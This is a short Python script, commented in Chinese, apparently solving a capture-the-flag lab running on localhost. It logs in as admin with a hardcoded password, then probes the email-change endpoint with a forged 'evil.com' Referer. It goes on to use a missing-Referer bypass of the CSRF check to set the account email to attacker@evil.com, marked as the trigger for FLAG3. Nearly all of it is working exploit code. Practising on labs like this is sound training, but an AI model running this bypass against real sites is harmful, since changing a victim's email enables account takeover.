import requests

BASE = "http://127.0.0.1:5029"
s = requests.Session()

# 重置 + 重新登录（requests 自动管 cookie，不会复制出错）
s.get(BASE + "/reset")
r = s.post(BASE + "/login", data={"username":"admin","password":"admin123"})
print("登录状态:", "已登录" if "已登录：admin" in r.text or "转账" in r.text else "失败")
print()

# === 测 Referer：带"攻击者来源"看被不被拒 ===
print("=== 测 Referer 检查 ===")
r = s.post(BASE + "/change-email", data={"email":"x@x.com"},
           headers={"Referer":"http://evil.com/"})
if "拒绝：来源不合法" in r.text:
    print("结果：有 Referer 检查（被拒绝）")
elif "邮箱已修改为：x@x.com" in r.text:
    print("结果：没有 Referer 检查（漏洞！FLAG3 触发条件）")
print()

# === 反向验证：空 Referer 看是否放行 ===
print("=== 测空 Referer 放行（FLAG3 真正的绕过方式）===")
r = s.post(BASE + "/change-email", data={"email":"attacker@evil.com"})
print("空Referer结果:", "邮箱已修改" if "邮箱已修改" in r.text else "拒绝")
